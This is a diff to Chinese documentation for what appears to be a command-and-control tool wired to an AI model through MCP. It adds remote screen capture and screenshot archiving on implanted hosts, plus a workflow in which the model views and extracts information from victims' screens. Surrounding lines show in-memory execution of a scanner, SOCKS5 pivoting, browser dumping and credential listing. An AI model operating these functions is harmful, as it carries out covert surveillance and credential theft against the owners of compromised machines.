@@ -132,6 +132,23 @@ easyshell_memory_exec(uid, "easyshell_plugins/tools/fscan.exe", "inline-bin", "-
 | `/listener/open` | POST |
 | `/listener/close` | POST |
 
+### 3.6 屏幕截屏 / 截屏历史（单次截屏走 REST，可对话展示）
+
+> Web 实时键鼠 / 录屏是 **WebSocket 流**（`ws/screen`），MCP 无法轮询；
+> 但**单次截屏** `GET /client/screen/capture` 是同步 REST——下发后等服务端回包（上限 300s），
+> MCP 已封装为：截屏 → 本地保存 PNG/JPG → **对话中直接打开图片展示**。
+
+| 端点 | 方法 | 用途 | 参数 |
+|------|------|------|------|
+| `/client/screen/capture` | GET | 单次截屏（同步回包 Base64） | `uid`, `quality`, `maxEdge` |
+| `/client/screen/history` | POST | 归档截图到服务端（source=live/manual） | `uid`, `imageBase64`, `mime` |
+| `/client/screen/history` | GET | 列出归档 | `uid`, `page`, `page_size` |
+| `/client/screen/history/file` | GET | 下载单张归档图（二进制，明文 query） | `id`, `inline=1` |
+| `/client/screen/history` | DELETE | 删除归档 | body `{id}` |
+
+**对话展示链路：** `screen_capture` 返回**本机图片绝对路径** → 用图像查看能力
+（read_image / 打开附件）读该路径 → 截图即出现在对话中，可让模型直接描述/分析画面。
+
 ---
 
 ## 四、核心模式
@@ -169,6 +186,24 @@ easyshell_read_file(uid, "C:/r.txt")
 easyshell_start_socks5(uid, port=1080, force=True)
 # 本机: curl --socks5 127.0.0.1:1080 http://目标/
 ```
+
+### 模式 5：远程截屏并对话展示（替代 Web 实时画面）
+
+```python
+# 1. 截屏：图片落本机 easyshell_screenshots/，默认同步归档到服务端截屏历史
+easyshell_screen_capture(uid)          # 返回本机图片路径 + 归档 id
+
+# 2. 对话展示：用图像查看能力打开返回的本地路径（read_image / 附件粘贴）
+#    → 截图直接出现在对话中，可让模型描述画面/提取信息
+
+# 3. 回看服务端归档（换会话/换机器后仍可取回）
+easyshell_screen_history(uid)          # 列出历史（id、时间、尺寸）
+easyshell_screen_history_get(42)       # 下载 id=42 归档图到本机展示
+easyshell_screen_history_delete(42)    # 清理归档
+```
+
+慢 Beacon（http/dns，sleep 大）先 `easyshell_set_sleep(uid, 3)` 再截；
+无桌面会话的 Windows 宿主截屏会失败（看 Shell 中 `!Error`），不是工具问题。
 
 ---
 
@@ -236,6 +271,12 @@ easyshell_list_sensitive(uid)
 easyshell_read_sensitive(result_id)
 easyshell_dump_browser(uid, wait_seconds=45)
 easyshell_list_credentials(uid)
+
+# 截屏（对话展示：打开返回的本地图片路径即可）
+easyshell_screen_capture(uid, archive=True)
+easyshell_screen_history(uid)
+easyshell_screen_history_get(result_id)
+easyshell_screen_history_delete(result_id)
 
 # 本机 HTTP（Nacos 等）
 easyshell_send_http(url, headers="User-Agent: Nacos-Server")
